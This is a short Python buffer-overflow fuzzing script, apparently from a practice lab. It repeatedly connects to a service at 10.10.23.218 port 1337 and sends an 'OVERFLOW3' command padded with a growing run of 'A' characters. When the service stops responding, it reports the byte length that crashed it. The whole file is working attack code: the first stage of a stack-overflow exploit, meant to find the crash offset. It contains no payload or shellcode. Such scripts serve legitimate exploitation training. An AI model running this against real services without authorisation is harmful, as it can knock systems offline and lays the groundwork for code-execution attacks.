import sys, socket, time

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.23.218", 1337))
        s.send(("OVERFLOW3 " + buffer + "\r\n").encode())
        print(f"sending {len(buffer)} bytes")
        time.sleep(1)
        buffer += "A" * 100
        s.recv(1024)
        s.close()
    except Exception:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        sys.exit()
